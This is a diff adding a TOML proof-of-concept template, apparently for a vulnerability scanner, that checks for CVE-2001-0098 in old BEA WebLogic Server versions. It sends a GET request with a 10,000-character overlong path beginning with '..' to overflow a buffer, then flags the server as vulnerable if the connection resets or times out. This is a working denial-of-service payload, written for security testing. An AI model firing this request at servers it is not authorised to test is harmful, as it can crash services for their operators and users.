@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "BEA WebLogic Server 4.0.x/4.5.x/5.1.x 双点缓冲区溢出漏洞验证。发送以..开头的超长URL请求触发缓冲区溢出，检测服务器是否崩溃（DoS）。如果服务器在请求后无响应或连接被重置，则判定存在漏洞。"
+id = "POC-AVE-2001-0041"
+name = "CVE-2001-0098 PoC"
+severity = "critical"
+tags = ["cve-2001-0098"]
+vuln_id = [
+    "CVE-2001-0098",
+    "AVE-2001-0041",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/..{{repeat(10000, 'A')}}"
+protocol = "http"
+
+[poc.requests.headers]
+Connection = "close"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "EOF_ERROR",
+    "connection_reset",
+    "timeout",
+]
